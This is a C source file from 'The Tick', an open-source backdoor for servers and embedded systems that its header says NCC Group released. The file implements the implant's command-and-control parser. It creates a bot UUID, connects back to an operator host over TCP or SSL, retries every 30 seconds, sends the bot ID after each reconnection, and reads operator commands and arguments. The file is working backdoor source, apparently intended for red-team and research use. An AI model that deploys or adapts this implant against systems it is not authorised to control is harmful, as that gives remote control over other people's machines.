/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "parser.h"

#include "command.h"
#include "shell.h"
#include "tcp.h"

// Helper function to generate UUIDv4 values.
// Output buffer is assumed to be exactly 16 bytes long.
void uuid4(unsigned char *uuid)
{
    // Generate 16 random numbers using rand().
    // This is really bad but it works as a fallback.
    srand((unsigned int) time(NULL) ^ (unsigned int) getpid());
    int i;
    for (i = 0; i < 16; i++) {
        uuid[i] = (unsigned char) (unsigned int) rand();
    }

    // Do it again but this time using /dev/urandom.
    // Since we're overwriting the buffer we get a fallback.
    // Paranoid? Absolutely! ;)
#ifndef _WIN32
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        int total = 0;
        while (total < 16) {
            int bytes = read(fd, &uuid[total], 16 - total);
            if (bytes <= 0) break;  // should never happen...
            total = total + bytes;
        }
        close(fd);
    }
#endif

    // We need to make some bits fixed to follow the RFC.
    uuid[6] = 0x40 | (uuid[6] & 0xf);
    uuid[8] = 0x80 | (uuid[8] & 0x3f);
}

// Helper function to tell if a buffer is zeroed out.
int is_empty(const char *buffer, size_t size)
{
    char j = 0;
    size_t i;
    for (i = 0; i < size; i++) {
        j |= buffer[i];
    }
    return j == 0 ? 1 : 0;
}

// Initialize the parser.
void parser_init(Parser *parser, const Settings *settings)
{
#ifdef _WIN32
    if (is_empty(settings->uuid, sizeof(settings->uuid))) {
        uuid4((unsigned char *) parser->uuid);
    } else {
        memcpy(parser->uuid, settings->uuid, sizeof(parser->uuid));
    }
#else
    uuid4((unsigned char *) parser->uuid);
#endif
    memcpy(parser->hostname, settings->hostname, sizeof(parser->hostname));
    parser->port = settings->port;
    parser->fd = -1;
#ifndef TICK_FEATURES_NO_CRYPTO
    parser->use_ssl = settings->use_ssl;
    memset(&parser->ssl, 0, sizeof(parser->ssl));
#endif
    parser->header.cmd_id = 0;
    parser->header.cmd_len = 0;
    parser->header.data_len = 0;
    memset(parser->buffer, 0, sizeof(parser->buffer));
}

// Closes the file descriptor and resets some internal variables.
void parser_close(Parser *parser)
{
    if (parser->fd >= 0) {
        shutdown(parser->fd, 2);    // SHUT_RDWR / SD_BOTH: shut down abruptly
        close(parser->fd);
    }
    parser->fd = -1;
#ifndef TICK_FEATURES_NO_CRYPTO
    memset(&parser->ssl, 0, sizeof(parser->ssl));
#endif
    parser->header.cmd_id = 0;
    parser->header.cmd_len = 0;
    parser->header.data_len = 0;
    memset(&parser->buffer, 0, sizeof(parser->buffer));
}

// Send a command response header. Data should be sent by the caller.
void parser_begin_response(Parser *parser, uint8_t status, uint16_t length)
{
    RESP_HEADER resp;

    resp.status = status;
    resp.data_len = htonl(length);
#ifdef TICK_FEATURES_NO_CRYPTO
    send_block(parser->fd, (const char *) &resp, sizeof(resp));
#else
    if (parser->use_ssl) {
        ssl_send_block(&parser->ssl, (const char *) &resp, sizeof(resp));
    } else {
        send_block(parser->fd, (const char *) &resp, sizeof(resp));
    }
#endif
}

// Send an empty success response.
void parser_ok(Parser *parser)
{
    parser_begin_response(parser, CMD_STATUS_OK, 0);
}

// Send an error response.
void parser_error(Parser *parser, const char *error)
{
    uint16_t length = 0;
    if (error != NULL) {
        length = (uint16_t) strlen(error);
        if (length != strlen(error)) {
            length = 0;
        }
    }
    parser_begin_response(parser, CMD_STATUS_ERROR, length);
    if (length > 0) {
#ifdef TICK_FEATURES_NO_CRYPTO
        send_block(parser->fd, error, length);
#else
        if (parser->use_ssl) {
            ssl_send_block(&parser->ssl, error, length);
        } else {
            send_block(parser->fd, error, length);
        }
#endif
    }
}

// Test to see if the socket is connected.
int parser_is_connected(Parser *parser)
{
    return (parser->fd >= 0 && send(parser->fd, NULL, 0, MSG_NOSIGNAL) == 0);
}

// If not conected, connects the socket. If connected, does nothing.
void parser_connect(Parser *parser)
{
    // Do nothing if we're already connected.
    if ( ! parser_is_connected(parser) ) {

        // Close the old socket and reset internal variables.
        parser_close(parser);

        // Reconnection only makes sense when using TCP connect back.
        // Make sure this is the case.
        if (parser->hostname != NULL) {

            // Connect to the given hostname and port.
            LOG("Connecting to %s:%d...\n", parser->hostname, parser->port);
            while (parser->fd < 0) {
#ifdef TICK_FEATURES_NO_CRYPTO
                parser->fd = connect_to_host(parser->hostname, parser->port);
#else
                if (parser->use_ssl) {
                    parser->fd = -1;
                    ssl_connect_to_host(&parser->ssl, &parser->fd, parser->hostname, parser->port);
                } else {
                    parser->fd = connect_to_host(parser->hostname, parser->port);
                }
#endif
                if (parser->fd < 0) {
                    LOG("Error connecting, waiting 30 seconds to retry...\n");
                    sleep(30);  // Sleep 30 seconds between failed attempts
                } else {
                    LOG("Connected to %s:%d\n", parser->hostname, parser->port);
                }
            }

            // Send the bot ID immediately after a successful (re)connection.
#ifdef TICK_FEATURES_NO_CRYPTO
            send_block(parser->fd, parser->uuid, sizeof(parser->uuid));
#else
            if (parser->use_ssl) {
                ssl_send_block(&parser->ssl, parser->uuid, sizeof(parser->uuid));
            } else {
                send_block(parser->fd, parser->uuid, sizeof(parser->uuid));
            }
#endif

        // If reconnection is not possible, set a fake quit command.
        // This will kill the listener on error.
        } else {
            parser->header.cmd_id = CMD_SYSTEM_EXIT;
            parser->header.cmd_len = 0;
            parser->header.data_len = 0;
        }
    }
}

// Blocking call to wait for the next command.
// Will reconnect the socket automatically if needed.
void parser_wait(Parser *parser)
{

    // Reconnect automatically if needed.
    // If reconnection fails permanently, exit.
    parser_connect(parser);
    if ( ! parser_is_connected(parser) ) {
        return;
    }

    // Read the command block header.
    // Drop and restart if the connection is interrupted.
    // If reconnection fails permanently, exit.
    while (1) {
        memset((void *) &parser->header, 0, sizeof(parser->header));
        int success = 0;
#ifdef TICK_FEATURES_NO_CRYPTO
        success = recv_block(parser->fd, (char *) &parser->header, sizeof(parser->header));
#else
        if (parser->use_ssl) {
            success = ssl_recv_block(&parser->ssl, (char *) &parser->header, sizeof(parser->header));
        } else {
            success = recv_block(parser->fd, (char *) &parser->header, sizeof(parser->header));
        }
#endif
        if (success < 0) {
            parser_close(parser);
            parser_connect(parser);
            if ( ! parser_is_connected(parser) ) {
                return;
            }
            continue;
        }
        break;
    }

    // Fix the endianness.
    parser->header.cmd_id = ntohs(parser->header.cmd_id);
    parser->header.cmd_len = ntohs(parser->header.cmd_len);
    parser->header.data_len = ntohl(parser->header.data_len);

    // Clean up the internal buffer.
    memset((void *) &parser->buffer, 0, sizeof(parser->buffer));
}

// Skip all extra data in the socket until the next command header.
void parser_next(Parser *parser)
{
    // If we are connected...
    if (parser_is_connected(parser)) {

        // Calculate how much unread data we have in the socket.
        size_t extra_data = (size_t) parser->header.cmd_len + (size_t) parser->header.data_len;

        // If we have unread data...
        if (extra_data > 0) {

            // Skip as many bytes as needed.
            int success = 0;
#ifdef TICK_FEATURES_NO_CRYPTO
            success = consume_extra_data(parser->fd, extra_data);
#else
            if (parser->use_ssl) {
                success = ssl_consume_extra_data(&parser->ssl, extra_data);
            } else {
                success = consume_extra_data(parser->fd, extra_data);
            }
#endif
            if (success < 0) {

                // On error, reconnect and reset internal variables.
                parser_connect(parser);

            } else {
                
                // On success, update the internal variables.
                parser->header.cmd_len = 0;
                parser->header.data_len = 0;

            }
        }

    // If we are not connected...
    } else {

        // Reconnect and reset internal variables.
        parser_connect(parser);
    }
}

// Read the first argument for the current command into an arbitrary buffer.
// Note that the argument IS NOT guaranteed to be null terminated!
// Returns 0 on success or -1 on error (and drops the connection).
int parser_read_first_arg(Parser *parser, char *buffer, size_t count)
{
    // Discard commands where the first argument is larger than the buffer size.
    if ((size_t) parser->header.cmd_len > count) {
        LOG("Error: first argument too long: %d > %d\n", (unsigned int) parser->header.cmd_len, (unsigned int) count);
        parser_error(parser, "first argument to long");
        return -1;
    }

    // Load the first argument into the buffer.
    memset((void *) buffer, 0, count);
    int success = 0;
#ifdef TICK_FEATURES_NO_CRYPTO
    success = recv_block(parser->fd, buffer, parser->header.cmd_len);
#else
    if (parser->use_ssl) {
        success = ssl_recv_block(&parser->ssl, buffer, parser->header.cmd_len);
    } else {
        success = recv_block(parser->fd, buffer, parser->header.cmd_len);
    }
#endif

    // On error drop the connection.
    if (success < 0) {
        parser_close(parser);
        return -1;
    }

    // Update the internal counter.
    parser->header.cmd_len = 0;
    return 0;
}

// Read the first argument for the current command into our internal buffer.
// When using this function, the argument is guaranteed to be null terminated.
// Returns 0 on success or -1 on error (and drops the connection).
int parser_get_first_arg(Parser *parser)
{
    memset(parser->buffer, 0, sizeof(parser->buffer));
    return parser_read_first_arg(parser, (char *) &parser->buffer, sizeof(parser->buffer) - 1);
}
